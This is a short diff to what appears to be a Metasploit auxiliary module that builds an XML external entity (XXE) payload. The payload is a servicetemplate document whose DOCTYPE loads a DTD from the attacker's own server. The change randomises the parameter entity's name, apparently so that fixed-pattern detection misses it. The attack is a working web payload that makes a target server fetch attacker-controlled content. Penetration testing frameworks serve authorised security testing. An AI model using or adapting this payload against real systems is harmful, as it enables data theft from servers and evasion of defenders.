@@ -196,12 +196,13 @@ class MetasploitModule < Msf::Auxiliary
     # unable to find valid certification path to requested target"
     dtd_url = "http://#{srvhost_addr}:#{srvport}/#{@dtd_filename}"
     template_name = Rex::Text.rand_text_alpha(8..15)
+    ent_xxe = Rex::Text.rand_text_alpha(4..8)
 
     <<~XML
       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE servicetemplate [
-      <!ENTITY % xxe SYSTEM "#{dtd_url}">
-      %xxe;
+      <!ENTITY % #{ent_xxe} SYSTEM "#{dtd_url}">
+      %#{ent_xxe};
       ]>
       <servicetemplate syntaxversion="2.1.0.0">
       <name>#{template_name}</name>
